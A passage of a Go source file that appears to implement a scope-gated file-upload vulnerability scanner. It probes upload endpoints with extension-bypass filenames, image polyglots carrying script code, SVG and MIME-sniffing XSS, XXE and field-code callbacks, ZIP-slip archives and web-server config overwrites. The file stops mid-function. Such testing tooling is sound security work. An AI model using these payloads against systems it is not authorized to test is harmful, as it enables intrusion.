package scanner

// FileUploadScanner validates dangerous file-upload behavior only for insertion
// points admitted by Reconner's existing target scope/authorization context. It
// never treats upload acceptance as a vulnerability: a finding requires a
// separately retrieved execution marker, browser-proven stored SVG execution,
// an attributed OOB processing callback, or retrieval of a ZIP member outside
// the intended upload directory.

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image"
	"image/gif"
	"image/jpeg"
	"image/png"
	"io"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"net/url"
	"path"
	"regexp"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/recon-platform/internal/config"
	"github.com/recon-platform/internal/database"
	"github.com/recon-platform/internal/tools"
	"github.com/recon-platform/pkg/logger"
)

const (
	fileUploadMaxPoints   = 80
	fileUploadMaxResponse = 256 * 1024
)

var fileUploadClient = newPooledClient(18*time.Second, false)

type FileUploadScanner struct {
	db        *database.DB
	exec      *tools.Executor
	cfg       *config.Config
	logger    *logger.Logger
	broadcast BroadcastFunc
	// Kept injectable so deterministic local tests do not require a host Chrome.
	confirmStoredXSS func(context.Context, string, map[string]string, string) bool
}

func NewFileUploadScanner(db *database.DB, exec *tools.Executor, cfg *config.Config, log *logger.Logger, broadcast BroadcastFunc) *FileUploadScanner {
	s := &FileUploadScanner{db: db, exec: exec, cfg: cfg, logger: log, broadcast: broadcast}
	s.confirmStoredXSS = func(ctx context.Context, publicURL string, headers map[string]string, marker string) bool {
		browser := getXSSBrowser()
		return browser != nil && browser.fireWithHeaders(ctx, publicURL, headers, marker)
	}
	return s
}

type uploadProofKind uint8

const (
	proofExecution uploadProofKind = iota + 1
	proofStoredSVG
	proofOOB
	proofZipSlip
	proofConfigEffect
	proofSQLiError
)

type fileUploadAttempt struct {
	name, subtype, filename, contentType string
	body                                 []byte
	marker                               string
	proof                                uploadProofKind
	oobKind                              string
	// dispositionOverride, when non-empty, replaces the normal single-filename
	// Content-Disposition header verbatim. Used for confusion attacks that need
	// more than one filename parameter (RFC 5987 filename*=) or a raw control
	// byte a %q-quoted Sprintf would otherwise escape (null-byte truncation).
	dispositionOverride string
}

type uploadResult struct {
	status int
	body   string
	urls   []string
	item   EvidenceItem
}

var uploadFieldNames = map[string]bool{
	"file": true, "files": true, "avatar": true, "attachment": true,
	"attachments": true, "document": true, "upload": true, "uploads": true,
	"image": true, "photo": true, "picture": true, "media": true, "asset": true,
	"blob": true, "binary": true, "content": true, "data": true, "base64": true,
}

var uploadMetadataNames = map[string]bool{
	"filename": true, "file_name": true, "name": true, "mime": true,
	"mimetype": true, "mime_type": true, "contenttype": true, "content_type": true,
}

func uploadLeafName(name string) string {
	name = strings.ToLower(strings.TrimSpace(name))
	if i := strings.LastIndexAny(name, ".[]"); i >= 0 {
		name = strings.Trim(name[i+1:], "[]")
	}
	return strings.TrimSuffix(name, "_data")
}

func hasUploadMetadataSibling(ip insertionPoint) bool {
	for name := range ip.Siblings {
		if uploadMetadataNames[uploadLeafName(name)] {
			return true
		}
	}
	return false
}

func eligibleFileUploadPoint(ip insertionPoint) bool {
	if insertionLocation(ip) == "multipart" {
		// A multipart form exposes every successful control as an insertion
		// point so required CSRF/tenant/action fields can be replayed as
		// siblings.  Only the actual file-like control is an upload target;
		// probing every multipart control duplicates findings and mutates form
		// plumbing that must remain stable.
		name := uploadLeafName(ip.Param)
		if uploadMetadataNames[name] {
			return false
		}
		return uploadFieldNames[name] || paramProneTo(ClassUpload, ip.Param, ip.Value)
	}
	loc := insertionLocation(ip)
	if loc != "json" && loc != "body" {
		return false
	}
	name := uploadLeafName(ip.Param)
	if name == "content" || name == "data" || name == "body" || name == "value" {
		value := strings.TrimSpace(ip.Value)
		looksEncoded := strings.HasPrefix(strings.ToLower(value), "data:") || (len(value) >= 32 && base64ishUploadValue(value))
		return hasUploadMetadataSibling(ip) || looksEncoded
	}
	return uploadFieldNames[name]
}

func base64ishUploadValue(value string) bool {
	value = strings.TrimSpace(value)
	if len(value)%4 != 0 {
		return false
	}
	for _, r := range value {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '+' || r == '/' || r == '=' {
			continue
		}
		return false
	}
	return true
}

func (s *FileUploadScanner) Run(ctx context.Context, targetID string, logFn LogFunc) error {
	limit := fileUploadMaxPoints
	if s.cfg != nil && s.cfg.URLLimit() > 0 && s.cfg.URLLimit() < limit {
		limit = s.cfg.URLLimit()
	}
	// Upload points are not necessarily reflected and commonly live on CMS/API
	// routes. The proof gate is independent, so use the broad routed loader rather
	// than the generic injection loader that intentionally drops those surfaces.
	all := loadRoutedInsertionPoints(ctx, s.db, targetID, ClassUpload, limit*4, -1)
	points := make([]insertionPoint, 0, minInt(limit, len(all)))
	for _, ip := range all {
		if eligibleFileUploadPoint(ip) && urlHostInScope(ctx, ip.URL) && urlInEndpointScope(ctx, ip.URL) {
			points = append(points, ip)
			if len(points) == limit {
				break
			}
		}
	}
	// Every upstream discoverer (JS static analysis, OpenAPI/Swagger parsing,
	// directory/path discovery) can only ever hand this module a "parameter"
	// it already recorded; a bare literal like "/api/upload" seen only in a JS
	// bundle, or an upload widget's conventional path implied by nothing but
	// product documentation, never becomes a `parameters` row and so is
	// structurally invisible to loadRoutedInsertionPoints above. This closes
	// that gap independently, by trying common upload paths directly against
	// every live host this target has — regardless of which module (or none)
	// ever found that host.
	if len(points) < limit {
		seen := make(map[string]bool, len(points))
		for _, p := range points {
			seen[p.URL+"|"+p.Param] = true
		}
		for _, ip := range s.discoverBlindUploadPoints(ctx, targetID, logFn) {
			key := ip.URL + "|" + ip.Param
			if seen[key] {
				continue
			}
			seen[key] = true
			points = append(points, ip)
			if len(points) == limit {
				break
			}
		}
	}
	if len(points) == 0 {
		logFn("info", "file_upload", "No eligible multipart or file-like structured insertion points")
		return nil
	}
	logFn("info", "file_upload", fmt.Sprintf("Testing %d scoped upload insertion point(s) with proof-gated retrieval and processing checks...", len(points)))
	auth := loadAuthHeaders(ctx, s.db, targetID)
	sem := make(chan struct{}, 4)
	var wg sync.WaitGroup
	var findings atomic.Int64
	for _, point := range points {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(ip insertionPoint) {
			defer wg.Done()
			defer func() { <-sem }()
			findings.Add(int64(s.scanPoint(ctx, targetID, ip, auth, logFn)))
		}(point)
	}
	wg.Wait()
	logFn("info", "file_upload", fmt.Sprintf("File-upload checks complete: %d verified finding(s)", findings.Load()))
	return ctx.Err()
}

const (
	fileUploadBlindProbeConcurrency = 10
	fileUploadBlindMaxLiveEndpoints = 12
	fileUploadBlindMaxBases         = 40
)

// defaultUploadPaths seeds blind discovery of upload endpoints (see
// discoverBlindUploadPoints) that no other module ever surfaced as a
// "parameter": a bare literal like "/api/upload" seen only inside a JS
// bundle, or a third-party upload-widget connector path implied only by that
// widget's own documentation, never produces a body/multipart field for
// loadRoutedInsertionPoints to route. Covers common app-framework upload
// routes and the handful of third-party upload widgets (CKEditor/CKFinder/
// FCKeditor, TinyMCE filemanager, elFinder, Plupload, jQuery-File-Upload)
// still found on real targets. Operator-extensible via the "upload" corpus
// category, same as backup/directory wordlists.
var defaultUploadPaths = []string{
	"/upload", "/uploads", "/api/upload", "/api/uploads", "/api/v1/upload", "/api/v1/uploads",
	"/api/v1/files", "/api/v1/media", "/api/file", "/api/files", "/api/files/upload",
	"/api/media/upload", "/api/media", "/api/attachments", "/api/attachment/upload",
	"/file/upload", "/files/upload", "/media/upload", "/admin/upload", "/admin/upload.php",
	"/upload.php", "/uploader.php", "/uploadify/uploadify.php", "/plupload/examples/upload.php",
	"/jquery-file-upload/server/php/index.php", "/elfinder/php/connector.php",
	"/elFinder/php/connector.php", "/ckeditor/filemanager/connectors/php/upload.php",
	"/ckfinder/core/connector/php/connector.php", "/fckeditor/editor/filemanager/connectors/php/upload.php",
	"/tiny_mce/plugins/filemanager/upload.php", "/tinymce/plugins/filemanager/upload.php",
	"/wp-admin/async-upload.php", "/wp-json/wp/v2/media", "/rest/upload", "/rest/v1/upload",
	"/avatar/upload", "/user/avatar", "/profile/avatar", "/account/avatar",
	"/attachments/upload", "/document/upload", "/documents/upload",
	"/FileUploadHandler.ashx", "/handlers/fileupload.ashx", "/upload.ashx",
}

// blindUploadFieldNames is deliberately short (not the full uploadFieldNames
// map): each extra name doubles the request volume of every path on every
// live host, and this module already stays inside Reconner's non-abusive
// blind-guess envelope (comparable in scale to exposure.go's config-leak
// path list) rather than exhaustively trying every known upload field name
// against every guessed path.
var blindUploadFieldNames = []string{"file", "avatar"}

// discoverBlindUploadPoints probes common upload paths against every live
// host this target has, independent of whether any other module ever
// recorded a matching `parameters` row. It sends ONE harmless multipart
// probe (a small text file) per (host, path, field-name) combination; only
// combinations that plausibly accept a multipart upload — a non-404/405
// response that doesn't match the host's own soft-404 catch-all baseline —
// are turned into an insertion point and handed to the full attack-payload
// ladder. This never claims a vulnerability itself; it only decides what is
// worth running the real proof-gated attempts against.
func (s *FileUploadScanner) discoverBlindUploadPoints(ctx context.Context, targetID string, logFn LogFunc) []insertionPoint {
	corpusDir := ""
	if s.cfg != nil {
		corpusDir = s.cfg.WordlistsDir
	}
	paths := LoadCorpus(corpusDir, "upload", defaultUploadPaths)
	bases := s.loadUploadServiceBases(ctx, targetID, fileUploadBlindMaxBases)
	if len(bases) == 0 || len(paths) == 0 {
		return nil
	}

	sem := make(chan struct{}, fileUploadBlindProbeConcurrency)
	var wg sync.WaitGroup
	var mu sync.Mutex
	var found []insertionPoint

	for _, base := range bases {
		if ctx.Err() != nil {
			break
		}
		mu.Lock()
		full := len(found) >= fileUploadBlindMaxLiveEndpoints
		mu.Unlock()
		if full {
			break
		}
		b := strings.TrimRight(base, "/")
		wg.Add(1)
		sem <- struct{}{}
		go func(b string) {
			defer wg.Done()
			defer func() { <-sem }()
			bl := soft404Baseline(ctx, b)
			for _, p := range paths {
				if ctx.Err() != nil {
					return
				}
				mu.Lock()
				full := len(found) >= fileUploadBlindMaxLiveEndpoints
				mu.Unlock()
				if full {
					return
				}
				u := b + p
				if !urlHostInScope(ctx, u) || !urlInEndpointScope(ctx, u) {
					continue
				}
				field, status, body := s.probeBlindUpload(ctx, u)
				if field == "" || bl.matches(status, []byte(body), "") {
					continue
				}
				mu.Lock()
				if len(found) < fileUploadBlindMaxLiveEndpoints {
					found = append(found, insertionPoint{URL: u, Param: field, Method: "POST", Location: "multipart", ContentType: "multipart/form-data"})
				}
				mu.Unlock()
			}
		}(b)
	}
	wg.Wait()
	if len(found) > 0 {
		logFn("info", "file_upload", fmt.Sprintf("Blind discovery found %d upload endpoint(s) with no prior known parameter", len(found)))
	}
	return found
}

// probeBlindUpload tries each candidate field name in turn and returns the
// first that yields a response distinguishable from a routing-level 404/405
// (proving only that the endpoint parses multipart uploads at all — never
// that anything about it is exploitable).
func (s *FileUploadScanner) probeBlindUpload(ctx context.Context, u string) (field string, status int, body string) {
	for _, name := range blindUploadFieldNames {
		if ctx.Err() != nil {
			return "", 0, ""
		}
		var buf bytes.Buffer
		mw := multipart.NewWriter(&buf)
		if part, err := mw.CreateFormFile(name, "recon-probe.txt"); err == nil {
			_, _ = part.Write([]byte("reconner upload discovery probe"))
		}
		_ = mw.Close()
		reqCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
		req, err := http.NewRequestWithContext(reqCtx, http.MethodPost, u, &buf)
		if err != nil {
			cancel()
			continue
		}
		req.Header.Set("Content-Type", mw.FormDataContentType())
		req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ReconBot/1.0)")
		resp, err := fileUploadClient.Do(req)
		cancel()
		if err != nil {
			continue
		}
		raw, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()
		if resp.StatusCode == 404 || resp.StatusCode == 405 {
			continue
		}
		return name, resp.StatusCode, string(raw)
	}
	return "", 0, ""
}

func (s *FileUploadScanner) loadUploadServiceBases(ctx context.Context, targetID string, limit int) []string {
	rows, err := s.db.QueryContext(ctx, `
		SELECT url FROM http_services
		WHERE target_id = ? AND status_code BETWEEN 200 AND 403
		ORDER BY url LIMIT ?
	`, targetID, limit)
	if err != nil {
		return nil
	}
	defer rows.Close()
	var bases []string
	for rows.Next() {
		var u string
		if err := rows.Scan(&u); err == nil {
			bases = append(bases, u)
		}
	}
	return filterURLsByHostScope(ctx, bases)
}

func (s *FileUploadScanner) scanPoint(ctx context.Context, targetID string, ip insertionPoint, auth map[string]string, logFn LogFunc) int {
	oob, hasOOB := newOOBCapability(s.cfg)
	attempts := fileUploadAttempts(oob, hasOOB, s.db, targetID, ip)
	found := 0
	reported := map[string]bool{}
	for _, attempt := range attempts {
		if ctx.Err() != nil {
			break
		}
		if reported[attempt.subtype] {
			continue
		}
		attemptCtx, cancelAttempt := context.WithTimeout(ctx, 35*time.Second)
		result, err := s.upload(attemptCtx, ip, auth, attempt)
		if err != nil || result.status < 200 || result.status >= 400 {
			cancelAttempt()
			continue
		}
		var proofURL, evidence string
		switch attempt.proof {
		case proofExecution:
			proofURL, evidence = s.verifyExecution(attemptCtx, ip, auth, attempt, result.urls)
		case proofStoredSVG:
			proofURL, evidence = s.verifySVG(attemptCtx, auth, attempt, result.urls)
		case proofOOB:
			proofURL, evidence = s.verifyOOB(attemptCtx, attempt)
		case proofZipSlip:
			proofURL, evidence = s.verifyZipSlip(attemptCtx, ip, auth, attempt, result.urls)
		case proofConfigEffect:
			proofURL, evidence = s.verifyConfigEffect(attemptCtx, ip, auth, attempt)
		case proofSQLiError:
			proofURL, evidence = s.verifySQLiFilename(attemptCtx, ip, auth, attempt, result.body)
		}
		cancelAttempt()
		if evidence == "" {
			continue
		}
		stored := false
		if attempt.proof == proofOOB {
			stored = s.storeOOBFinding(ctx, targetID, ip, attempt, evidence, result.item)
		} else {
			stored = s.storeFinding(ctx, targetID, ip, attempt, proofURL, evidence, result.item)
		}
		if stored {
			reported[attempt.subtype] = true
			found++
			logFn("warn", "file_upload", attempt.name+" verified at "+proofURL)
		}
	}
	return found
}

func fileUploadAttempts(oob oobCapability, hasOOB bool, db *database.DB, targetID string, ip insertionPoint) []fileUploadAttempt {
	var out []fileUploadAttempt
	addExec := func(name, subtype, filename, contentType, language, prefix string) {
		marker := newXSSToken("rcnup")
		out = append(out, fileUploadAttempt{name: name, subtype: subtype, filename: filename,
			contentType: contentType, body: executableUploadBody(language, marker, prefix), marker: marker, proof: proofExecution})
	}
	for _, spec := range []struct{ ext, language string }{
		{".phtml", "php"}, {".pht", "php"}, {".phar", "php"}, {".php5", "php"}, {".php7", "php"}, {".php3", "php"}, {".php4", "php"},
		{".phtm", "php"}, {".pgif", "php"}, {".inc", "php"}, {".PhP", "php"}, {".pHp", "php"}, {".PHP", "php"},
		{".jspx", "jspx"}, {".jspf", "jsp"}, {".asp", "asp"}, {".asa", "asp"}, {".cer", "asp"}, {".ASP", "asp"}, {".Asp", "asp"},
		{".cfm", "cfm"}, {".cfml", "cfm"},
		{".shtml", "ssi"}, {".cgi", "shell"}, {".pl", "perl"}, {".py", "python"}, {".rb", "ruby"},
	} {
		addExec("extension blacklist bypass", "extension_blacklist", "recon"+spec.ext, "application/octet-stream", spec.language, "")
	}
	for _, suffix := range []string{
		".php.jpg", ".jpg.php", ".php%00.jpg", ".php ", ".php.",
		".php;.jpg", ".p.phphp", ".php::$DATA.jpg", ".php...jpg", ".php.​", ".php%20.jpg",
	} {
		addExec("extension whitelist bypass", "extension_whitelist", "recon"+suffix, "image/jpeg", "php", "")
	}
	addExec("PHP content-type mismatch", "content_type_mismatch", "recon.php", "image/jpeg", "php", "")
	addExec("JSP content-type mismatch", "content_type_mismatch", "recon.jsp", "image/jpeg", "jsp", "")
	addExec("ASPX content-type mismatch", "content_type_mismatch", "recon.aspx", "image/jpeg", "aspx", "")
	// Real, independently-decodable 1x1 images (built with Go's own stdlib
	// encoders, not a hand-rolled byte guess) with the payload appended after
	// the format's own terminator (GIF trailer / JPEG EOI / PNG IEND). A
	// getimagesize()-style validator that actually parses the image accepts
	// these; a naive one that only checks the leading magic bytes always did.
	// The old version just prepended the literal text "GIF89a" with no real
	// image structure behind it, so any handler that actually decoded the
	// upload rejected it outright.
	for _, spec := range []struct{ format, ext, language, mime string }{
		{"gif", ".php.gif", "php", "image/gif"},
		{"jpeg", ".php.jpg", "php", "image/jpeg"},
		{"png", ".php.png", "php", "image/png"},
		{"jpeg", ".jspx.jpg", "jspx", "image/jpeg"},
	} {
		addExec(strings.ToUpper(spec.format)+" magic-byte polyglot (real decodable image)", "magic_byte_polyglot", "recon"+spec.ext, spec.mime, spec.language, string(imagePolyglotPrefix(spec.format)))
	}
	addExec("server rename survival", "server_rename_survival", "recon-rename.php", "application/octet-stream", "php", "")

	// RFC 5987 filename*= confusion: a validator that only inspects the plain
	// ASCII `filename` parameter sees a safe extension while a multipart
	// parser that prefers the extended `filename*` parameter (as several
	// frameworks do) stores the dangerous one instead.
	{
		marker := newXSSToken("rcnup")
		disp := fmt.Sprintf(`form-data; name=%q; filename="recon-safe.jpg"; filename*=UTF-8''recon-ext.php`, ip.Param)
		out = append(out, fileUploadAttempt{name: "RFC 5987 filename*= confusion", subtype: "filename_star_confusion",
			filename: "recon-ext.php", contentType: "image/jpeg", body: executableUploadBody("php", marker, ""),
			marker: marker, proof: proofExecution, dispositionOverride: disp})
	}
	// Path traversal in the upload's OWN filename field (distinct from the
	// zip/tar archive-member traversal below): some frameworks join the
	// user-supplied filename onto the storage directory without stripping
	// "../" segments. Verification is response-hint-only (verifyExecution),
	// consistent with this codebase never guessing an unconfirmed absolute
	// path on its own.
	for _, depth := range []string{"../", "../../", "../../../", "../../../../"} {
		marker := newXSSToken("rcnup")
		out = append(out, fileUploadAttempt{name: "Filename path traversal", subtype: "filename_path_traversal",
			filename: depth + "recon-trav.php", contentType: "application/octet-stream", body: executableUploadBody("php", marker, ""),
			marker: marker, proof: proofExecution})
	}
	// Filename metadata SQL injection: many apps insert the raw filename into
	// an audit/media-library row unsanitized. Proof is differential (a second,
	// clean-filename upload is compared against this response for a NEW
	// database error signature), matching this codebase's error-based SQLi
	// methodology elsewhere rather than trusting a single response in isolation.
	out = append(out, fileUploadAttempt{name: "SQLi via filename metadata (error-based)", subtype: "filename_sqli_error",
		filename: `recon'"sqli.txt`, contentType: "text/plain", body: []byte("reconner sqli filename probe"),
		marker: newXSSToken("rcnsqli"), proof: proofSQLiError})

	xssMarker := newXSSToken("rcnsvg")
	svg := `<svg xmlns="http://www.w3.org/2000/svg" onload="document.title='` + xssMarker + `'">` +
		`<script>document.title='` + xssMarker + `'</script></svg>`
	out = append(out, fileUploadAttempt{name: "SVG stored XSS", subtype: "svg_stored_xss", filename: "recon.svg", contentType: "image/svg+xml", body: []byte(svg), marker: xssMarker, proof: proofStoredSVG})

	// A sanitizer that strips <script>/onload but not every event handler is a
	// common partial defense; these use different elements/handlers so at
	// least one usually survives.
	for _, spec := range []struct{ subtype, filename, body string }{
		{"svg_stored_xss", "recon-animate.svg", `<svg xmlns="http://www.w3.org/2000/svg"><animate attributeName="x" from="0" to="0" dur="1s" begin="0s" onbegin="document.title='%MARKER%'"/></svg>`},
		{"svg_stored_xss", "recon-foreign.svg", `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><foreignObject width="100" height="50"><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror="document.title='%MARKER%'"></body></foreignObject></svg>`},
	} {
		marker := newXSSToken("rcnsvg")
		body := strings.ReplaceAll(spec.body, "%MARKER%", marker)
		out = append(out, fileUploadAttempt{name: "SVG stored XSS (sanitizer-bypass variant)", subtype: spec.subtype, filename: spec.filename, contentType: "image/svg+xml", body: []byte(body), marker: marker, proof: proofStoredSVG})
	}

	// Stored XSS via browser MIME-sniffing on a non-SVG "image" upload: the
	// body starts with an HTML-sniff-triggering token (per the WHATWG
	// mime-sniffing spec) despite an image extension/Content-Type, betting
	// that the app never validates real pixel content and later serves the
	// file with no/generic Content-Type — letting the browser sniff and
	// render it as HTML. Distinct bug class from the SVG-specific one above:
	// it fires even where SVG uploads are specifically blocklisted.
	for _, ext := range []string{".jpg", ".png", ".gif"} {
		marker := newXSSToken("rcnsniff")
		body := "<!DOCTYPE html><html><body><script>document.title='" + marker + "'</script></body></html>"
		out = append(out, fileUploadAttempt{name: "Stored XSS via MIME-sniffing", subtype: "html_mime_sniff_stored_xss",
			filename: "recon-sniff" + ext, contentType: "image/jpeg", body: []byte(body), marker: marker, proof: proofStoredSVG})
	}

	if hasOOB {
		for _, spec := range []struct{ name, subtype, filename, mime, kind, format string }{
			{"SVG image-processing SSRF", "image_processing_ssrf", "recon-oob.svg", "image/svg+xml", "file_upload_ssrf", `<svg xmlns="http://www.w3.org/2000/svg"><image href="%s"/></svg>`},
			{"MVG image-processing SSRF", "image_processing_ssrf", "recon-oob.mvg", "image/x-mvg", "file_upload_ssrf", "push graphic-context\nviewbox 0 0 1 1\nimage over 0,0 1,1 '%s'\npop graphic-context"},
			// A server that renders an uploaded HTML file for preview/thumbnail
			// generation (headless-Chromium screenshot, wkhtmltopdf/wkhtmltoimage)
			// fetches every resource the page references, including from the
			// server's own network position — the same SSRF class as the
			// SVG/MVG image-processing delegates above, just for a different
			// rendering pipeline. %[1]s is reused for both tags so one OOB
			// token catches whichever resource type the renderer actually fetches.
			{"HTML-rendering SSRF (preview/PDF pipelines)", "image_processing_ssrf", "recon-oob.html", "text/html", "file_upload_ssrf", `<html><body><img src="%[1]s" width="1" height="1"><iframe src="%[1]s"></iframe></body></html>`},
		} {
			token := registerOOBProbe(db, targetID, ip.URL, ip.Param, spec.kind, "upload:"+spec.filename)
			out = append(out, fileUploadAttempt{name: spec.name, subtype: spec.subtype, filename: spec.filename, contentType: spec.mime,
				body: []byte(fmt.Sprintf(spec.format, oob.callbackURL(token))), marker: token, proof: proofOOB, oobKind: spec.kind})
		}
	}

	zipMarker := newXSSToken("rcnzip")
	out = append(out, fileUploadAttempt{name: "ZIP-slip extraction", subtype: "zip_slip", filename: "recon.zip", contentType: "application/zip",
		body: zipUpload(map[string][]byte{"../../" + zipMarker + ".txt": []byte(zipMarker)}), marker: zipMarker, proof: proofZipSlip})
	tarMarker := newXSSToken("rcntar")
	out = append(out, fileUploadAttempt{name: "TAR path-traversal extraction", subtype: "zip_slip", filename: "recon.tar.gz", contentType: "application/gzip",
		body: tarGzipUpload("../../"+tarMarker+".txt", []byte(tarMarker)), marker: tarMarker, proof: proofZipSlip})
	if hasOOB {
		for _, doc := range []struct{ ext, member, mime string }{
			{"docx", "word/document.xml", "application/vnd.openxmlformats-officedocument.wordprocessingml.document"},
			{"xlsx", "xl/workbook.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"},
			{"pptx", "ppt/presentation.xml", "application/vnd.openxmlformats-officedocument.presentationml.presentation"},
		} {
			token := registerOOBProbe(db, targetID, ip.URL, ip.Param, "file_upload_xxe", "upload:recon."+doc.ext)
			xml := `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "` + oob.callbackURL(token) + `">]><r>&xxe;</r>`
			body := zipUpload(map[string][]byte{"[Content_Types].xml": []byte(`<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>`), doc.member: []byte(xml)})
			out = append(out, fileUploadAttempt{name: strings.ToUpper(doc.ext) + " embedded XXE", subtype: "ooxml_xxe", filename: "recon." + doc.ext,
				contentType: doc.mime, body: body, marker: token, proof: proofOOB, oobKind: "file_upload_xxe"})
		}
		// Word's own INCLUDEPICTURE field code is a legitimate, non-CVE-specific
		// SSRF source distinct from the XXE above: a document-preview/conversion
		// pipeline that renders field codes (LibreOffice/Word headless
		// conversion) fetches the field's URL server-side to resolve the
		// picture, regardless of whether the converter's XML parser resolves
		// external entities at all.
		fieldToken := registerOOBProbe(db, targetID, ip.URL, ip.Param, "file_upload_ssrf", "upload:recon-fields.docx")
		fieldXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>` +
			`<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r>` +
			`<w:fldSimple w:instr="INCLUDEPICTURE &quot;` + oob.callbackURL(fieldToken) + `&quot; \* MERGEFORMAT">` +
			`<w:r><w:t>SSRF</w:t></w:r></w:fldSimple></w:r></w:p></w:body></w:document>`
		fieldBody := zipUpload(map[string][]byte{
			"[Content_Types].xml": []byte(`<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>`),
			"word/document.xml":   []byte(fieldXML),
		})
		out = append(out, fileUploadAttempt{name: "DOCX field-code (INCLUDEPICTURE) SSRF", subtype: "ooxml_field_code_ssrf", filename: "recon-fields.docx",
			contentType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", body: fieldBody, marker: fieldToken, proof: proofOOB, oobKind: "file_upload_ssrf"})
	}
	out = append(out,
		fileUploadAttempt{name: "Apache web-root config overwrite", subtype: "webroot_config_overwrite", filename: ".htaccess", contentType: "text/plain", body: []byte("AddType application/x-httpd-php .rcn\n"), marker: newXSSToken("rcnconf"), proof: proofConfigEffect},
		fileUploadAttempt{name: "IIS web-root config overwrite", subtype: "webroot_config_overwrite", filename: "web.config", contentType: "application/xml", body: []byte(`<configuration><system.webServer><handlers><add name="Recon" path="*.rcn" verb="*" modules="IsapiModule" scriptProcessor="%windir%\\System32\\inetsrv\\asp.dll" resourceType="File" /></handlers></system.webServer></configuration>`), marker: newXSSToken("rcnconf"), proof: proofConfigEffect},
	)
	return out
}

func executableUploadBody(language, marker, prefix string) []byte {
	cut := len(marker) / 2
	a, b := marker[:cut], marker[cut:]
	var code string
	switch language {
	case "jsp":
		code = `<% out.print("` + a + `" + "` + b + `"); %>`
	case "jspx":
		code = `<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0"><jsp:scriptlet>out.print("` + a + `" + "` + b + `");</jsp:scriptlet></jsp:root>`
	case "aspx":
		code = `<%= string.Concat("` + a + `", "` + b + `") %>`
	case "asp":
		code = `<% Response.Write "` + a + `" & "` + b + `" %>`
	case "cfm":
		code = `<cfoutput>#"` + a + `" & "` + b + `"#</cfoutput>`
	case "ssi":
		code = `<!--#set var="a" value="` + a + `" --><!--#set var="b" value="` + b + `" --><!--#echo var="a" --><!--#echo var="b" -->`
	case "shell":
		code = "#!/bin/sh\nprintf '%s%s' '" + a + "' '" + b + "'\n"
	case "perl":
		code = "#!/usr/bin/env perl\nprint \"Content-Type: text/plain\\n\\n\"; print '" + a + "'.'" + b + "';\n"
	case "python":
		code = "#!/usr/bin/env python3\nprint('Content-Type: text/plain\\n')\nprint('" + a + "' + '" + b + "')\n"
	case "ruby":
		code = "#!/usr/bin/env ruby\nputs 'Content-Type: text/plain\\n\\n'; print '" + a + "' + '" + b + "'\n"
	default:
		code = `<?php echo '` + a + `'.'` + b + `'; ?>`
	}
	return []byte(prefix + code)
}

// imagePolyglotPrefix returns a genuine 1x1 image, encoded by Go's own
// stdlib codec, that a caller appends executable code after. Real decoders
// (and getimagesize()-style validators, which only parse up to the format's
// own terminator: the GIF trailer, JPEG EOI, or PNG IEND) accept it as a
// valid image; trailing bytes after that terminator are not part of the
// image stream and are simply ignored, which is exactly the classic
// polyglot trick — but built from a real encoder instead of a hand-guessed
// byte sequence that a strict validator would reject.
func imagePolyglotPrefix(format string) []byte {
	img := image.NewGray(image.Rect(0, 0, 1, 1))
	var buf bytes.Buffer
	switch format {
	case "jpeg":
		_ = jpeg.Encode(&buf, img, nil)
	case "png":
		_ = png.Encode(&buf, img)
	default:
		_ = gif.Encode(&buf, img, nil)
	}
	return buf.Bytes()
}

func tarGzipUpload(name string, body []byte) []byte {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	_ = tw.WriteHeader(&tar.Header{Name: name, Mode: 0o600, Size: int64(len(body))})
	_, _ = tw.Write(body)
	_ = tw.Close()
	_ = gw.Close()
	return buf.Bytes()
}

func zipUpload(files map[string][]byte) []byte {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	keys := make([]string, 0, len(files))
	for name := range files {
		keys = append(keys, name)
	}
	sort.Strings(keys)
	for _, name := range keys {
		w, _ := zw.Create(name)
		_, _ = w.Write(files[name])
	}
	_ = zw.Close()
	return buf.Bytes()
}

func (s *FileUploadScanner) upload(ctx context.Context, ip insertionPoint, auth map[string]string, a fileUploadAttempt) (uploadResult, error) {
	reqCtx, cancel := context.WithTimeout(ctx, 16*time.Second)
	defer cancel()
	method := strings.ToUpper(strings.TrimSpace(ip.Method))
	if method == "" || method == "GET" {
		method = "POST"
	}
	var body io.Reader
	var contentType string
	if insertionLocation(ip) == "multipart" {
		var buf bytes.Buffer
		mw := multipart.NewWriter(&buf)
		for k, v := range ip.Siblings {
			if k != ip.Param {
				_ = mw.WriteField(k, v)
			}
		}
		h := make(textproto.MIMEHeader)
		if a.dispositionOverride != "" {
			h.Set("Content-Disposition", a.dispositionOverride)
		} else {
			h.Set("Content-Disposition", fmt.Sprintf(`form-data; name=%q; filename=%q`, ip.Param, a.filename))
		}
		h.Set("Content-Type", a.contentType)
		part, err := mw.CreatePart(h)
		if err != nil {
			return uploadResult{}, err
		}
		_, _ = part.Write(a.body)
		_ = mw.Close()
		body, contentType = &buf, mw.FormDataContentType()
	} else {
		root := buildJSONUploadPayload(ip, a)
		encoded, _ := json.Marshal(root)
		body, contentType = bytes.NewReader(encoded), "application/json"
	}
	req, err := http.NewRequestWithContext(reqCtx, method, ip.URL, body)
	if err != nil {
		return uploadResult{}, err
	}
